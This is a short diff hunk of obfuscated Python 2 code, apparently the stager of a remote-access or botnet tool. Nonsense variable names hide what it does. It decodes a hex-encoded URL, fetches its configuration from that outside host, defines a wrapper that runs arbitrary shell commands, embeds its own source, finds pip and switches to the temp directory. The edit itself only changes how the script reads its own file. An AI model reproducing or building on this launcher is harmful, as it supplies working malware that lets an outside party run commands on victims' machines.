@@ -14,7 +14,7 @@ def run(*args, **kwargs):
     SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
     RuthlessSpiffyTablecloth  = lambda x: os.popen(' '.join([i for i in x])).read().rstrip() if type(x) is list else os.popen(x).read().rstrip()
     AccidentalAquaticCactus   = json.loads(urllib2.urlopen(SomberUnbecomingAmusement(kwargs.get('config'))).read())
-    AccidentalAquaticCactus['settings']['__f__'] = bytes(IncontinentObtuseCucumber('launcher.py')) 
+    AccidentalAquaticCactus['settings']['__f__'] = bytes(IncontinentObtuseCucumber(__file__)) if '__file__' in globals() else ''
     GroovySophisticatedLemur  = os.popen('where pip').read().rstrip() if os.name is 'nt' else os.popen('which pip').read().rstrip()
     os.chdir(os.path.expandvars('%TEMP%')) if os.name is 'nt' else os.chdir('/tmp')
     if not len(GroovySophisticatedLemur):
